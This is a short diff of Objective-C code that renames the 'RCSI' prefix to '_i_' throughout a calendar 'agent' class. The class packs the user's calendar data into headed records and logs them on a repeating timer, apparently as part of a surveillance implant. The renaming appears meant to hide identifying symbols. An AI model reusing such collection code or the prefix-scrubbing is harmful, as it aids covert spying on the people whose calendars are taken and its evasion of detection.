@@ -15,9 +15,9 @@
 
 NSDate *gStartDate, *gEndDate;
 
-NSString *kRCSIAgentCalendarRunLoopMode = @"kRCSIAgentCalendarRunLoopMode";
+NSString *k_i_AgentCalendarRunLoopMode = @"k_i_AgentCalendarRunLoopMode";
 
-@implementation RCSIAgentCalendar
+@implementation _i_AgentCalendar
 
 #pragma mark -
 #pragma mark Class and init methods
@@ -298,7 +298,7 @@ NSString *kRCSIAgentCalendarRunLoopMode = @"kRCSIAgentCalendarRunLoopMode";
   tmpHeader = (HeaderStruct *) [calData bytes];  
   tmpHeader->dwSize = outLength;
 
-  RCSILogManager *logManager = [RCSILogManager sharedInstance];
+  _i_LogManager *logManager = [_i_LogManager sharedInstance];
 
   BOOL success = [logManager createLog: LOG_CALENDAR
                            agentHeader: nil
@@ -395,7 +395,7 @@ NSString *kRCSIAgentCalendarRunLoopMode = @"kRCSIAgentCalendarRunLoopMode";
                                                   userInfo: theDict 
                                                    repeats: YES];
   
-  [[NSRunLoop currentRunLoop] addTimer: timer forMode: kRCSIAgentCalendarRunLoopMode];
+  [[NSRunLoop currentRunLoop] addTimer: timer forMode: k_i_AgentCalendarRunLoopMode];
 }
 
 - (void)startAgent
@@ -437,7 +437,7 @@ NSString *kRCSIAgentCalendarRunLoopMode = @"kRCSIAgentCalendarRunLoopMode";
     {
       NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
 
-      [[NSRunLoop currentRunLoop] runMode: kRCSIAgentCalendarRunLoopMode 
+      [[NSRunLoop currentRunLoop] runMode: k_i_AgentCalendarRunLoopMode 
                                beforeDate: [NSDate dateWithTimeIntervalSinceNow: 1.0]];
 
       [innerPool release];
